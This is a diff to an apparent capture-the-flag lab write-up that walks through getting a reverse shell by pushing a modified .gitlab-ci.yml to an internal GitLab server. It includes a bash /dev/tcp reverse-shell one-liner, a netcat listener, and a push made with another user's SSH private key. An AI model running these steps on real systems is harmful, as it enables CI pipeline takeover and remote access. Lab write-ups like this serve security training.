@@ -118,8 +118,22 @@ PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
 ```
 - sh -i >& /dev/tcp/172.18.0.99/4545 0>&1
 ```
-- We can start the *netcat* listener.
+- Next step we must stage the updated *.gitlab-ci.yml* file and commit it.
+```bash
+git add --all;git config --global user.name "foo";git commit -m "foo"
+```
+- Now we can start the *netcat* listener.
 ```bash
 nc -lvnp 4545
 ```
-- Now we can background it with Crtl-Z (*^Z*). 
+- We can background it with Crtl-Z (*^Z*).
+- Now we need to configure github to use the ssh key and not the token. So just export this variable.
+```bash
+export GIT_SSH_COMMAND='ssh -i /home/samways/id_rsa'
+```
+- Cool, now we can push it.
+```bash
+git push git@gitlab.flag.net.internal:/rings-of-powder/wordpress.flag.net.internal.git
+```
+- Now we cant wait for the reverse shell. Unbackground the reverse shell with `fg`.
+- *Connection from 172.18.1.149 60740 received!* Y000000
